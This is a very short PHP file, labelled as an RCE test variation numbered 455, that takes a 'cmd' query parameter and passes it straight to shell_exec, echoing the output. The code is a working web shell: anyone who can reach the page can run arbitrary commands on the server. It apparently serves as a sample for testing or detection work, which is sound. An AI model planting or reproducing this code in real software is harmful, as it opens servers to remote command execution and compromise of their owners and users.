<?php
// RCE test variation #455
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>